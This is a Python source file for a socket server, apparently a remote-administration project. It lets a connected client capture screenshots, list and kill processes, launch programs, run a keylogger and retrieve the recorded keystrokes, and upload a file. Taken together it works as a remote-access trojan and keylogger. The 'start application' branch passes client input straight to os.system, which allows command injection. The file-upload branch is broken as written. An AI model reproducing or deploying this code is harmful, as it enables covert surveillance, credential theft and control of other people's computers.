import time
import socket
import os, signal
from typing import AsyncIterable, List
from PIL.Image import FASTOCTREE
from pynput import keyboard
import wmi
from dotenv import load_dotenv
import subprocess
import pyscreenshot as ImageGrab
from pynput import keyboard
import threading

#load enviroment variables
load_dotenv()
SERVER_HOST = os.getenv('SERVER_HOST')
SERVER_PORT = os.getenv('SERVER_PORT')
MAX_FILE_SIZE = os.getenv('MAX_FILE_SIZE')

#keyborad recode init
keyboardRecord = '' #string save record value
recorded = False

def processKeyPress(key: keyboard.KeyCode):
    key = str(key)
    key = key.replace("'", "")
    global keyboardRecord
    print(key)
    if len(key) == 1:
        keyboardRecord += key
    if (key == 'Key.enter'):
        keyboardRecord += '\n'
    if (key == 'Key.space'):
        keyboardRecord += ' '

listener = keyboard.Listener(on_press=processKeyPress)

#process function
def sendScreenShotImage(conn):
    im = open('screenshot.png', 'rb')
    imBytes = im.read()
    conn.sendall(imBytes)
    pass

def getProcessRunning():
    f = wmi.WMI()
    return f.Win32_process()

def getListRunningWinodws():
    cmd = 'powershell "gps | where {$_.MainWindowTitle } | select Description,Id'
    ret = []
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    for line in proc.stdout:
        if not line.decode()[0].isspace():
            temp = (line.decode().rstrip())
            ret.append(temp)
    ret = ret[2:]
    return ret

def processRequest(request, conn):
    if request == 'screenshot':
        im = ImageGrab.grab()
        im.save('screenshot.png')
        sendScreenShotImage(conn)
    
    if request == 'process running':
        listProcess = getProcessRunning()
        for process in listProcess:
            temp = (f"{process.ProcessId:<10} {process.Name}")
            conn.sendall(bytes(temp, 'utf8'))
        conn.sendall(b'done')

    if request == 'kill process':
        conn.sendall(b'Received request kill process')
        data = conn.recv(1024)
        processId = data.decode('utf8')
        os.kill(int(data), signal.SIGTERM)

    if request == 'application running':
        temp = getListRunningWinodws()
        for line in temp:
            time.sleep(0.1)
            conn.sendall(bytes(line, 'utf8'))
        conn.sendall(b'done')

    if request == 'start application':
        conn.sendall(b'application name')
        data = conn.recv(1024)
        print(data.decode('utf8'))
        res = os.system('start ' + data.decode('utf8'))
        conn.sendall(bytes(str(res), 'utf8'))

    if request == 'start key hook':
        global recorded
        global keyboardRecord
        if recorded == False:
            recorded = True
            keyboardRecord = ''
            listener.start()
            conn.sendall(b'start key hook success')
        else:
            conn.sendall(b'key hook is running')

    if request == 'stop key hook':
        if recorded == True:
            print(keyboardRecord)
            recorded = False
            listener.stop()
            conn.sendall(b'stop key hook success')
        else:
            conn.sendall(b'key hook is not running')
            print('key hook is not running')
    
    if request == 'get recorded string':
        conn.sendall(bytes(keyboardRecord, 'utf8'))

    if request == 'send file':
        conn.sendall(b'ready to recvive file')
        data = conn.recv(MAX_FILE_SIZE)
        file = open('fileReg.reg')
        file.write(data)

if __name__ == '__main__':
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((SERVER_HOST, int(SERVER_PORT)))
        s.listen()
        while True:
            conn, addr = s.accept()
            with conn:
                print('Connected by: ', addr)
                while True:
                    request = conn.recv(1024)
                    if not request:
                        break
                    processRequest(request.decode('utf8'), conn)
                conn.close()